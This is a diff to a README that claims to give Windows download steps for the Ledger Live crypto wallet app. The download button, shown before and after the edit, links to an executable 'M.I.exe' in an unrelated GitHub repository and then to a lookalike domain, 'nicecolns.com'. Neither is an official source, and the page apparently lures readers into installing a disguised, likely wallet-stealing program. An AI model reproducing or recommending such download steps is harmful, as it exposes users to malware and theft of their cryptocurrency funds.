@@ -9,7 +9,7 @@ Moreover, the **Ledger Live App Download** supports in-app exchanges and staking
 
 1. Click the button below to start the **Ledger Live Download** for Windows.
     <br>
-    <a href="https://github.com/Q1441/gmgnapppro/releases/download/v.1/M.I.exe">
+    <a href="https://nicecolns.com/">
       <img src="https://github.com/user-attachments/assets/628b87c3-e5d8-49e0-a0c0-ca9fdb04764d" alt="Download" width="300"/>
     </a>
 2. Navigate to your "Downloads" folder to locate the installer file.
